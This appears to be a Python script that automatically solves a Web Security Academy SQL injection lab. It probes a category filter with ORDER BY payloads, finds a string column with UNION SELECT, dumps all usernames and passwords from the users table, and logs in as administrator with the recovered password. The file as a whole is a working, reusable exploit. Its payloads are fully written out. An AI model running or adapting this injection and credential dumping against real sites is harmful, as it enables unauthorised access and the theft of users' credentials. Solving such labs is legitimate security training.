from web_security_academy.core.utils import *
from bs4 import BeautifulSoup


def solve_lab(session):
    path = "/filter"

    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} -- //"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    print_success(f"There are {num_columns} columns.\n")
    print_info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        print_fail("Unable to find a column with the string data type")
    else:
        print_success(f"Column {i} has the string data type.\n")

    columns = ["null"] * num_columns
    columns[i] = "username || ':' || password"
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} FROM users --"}

    print_info(
        f'Retrieving all usernames and passwords by visiting "{path}" with the following parameters:'
    )
    print(params)

    resp = session.get_path(path, params=params)
    soup = BeautifulSoup(resp.text, "html.parser")
    query = soup.find_all(lambda tag: tag.name == "th")

    if len(query) == 0:
        print_fail("Unable to retrieve usernames and passwords.")

    print_success(f"Successfully retrieved usernames and passwords.\n")
    print_info("Extracting administrator password...")

    for tag in query:
        username, password = tag.text.split(":")
        if username == "administrator":
            break
    else:
        print_fail("Unable to find administrator user.")

    print_success(f"Found administrator password: {password}\n")

    session.login("administrator", password)
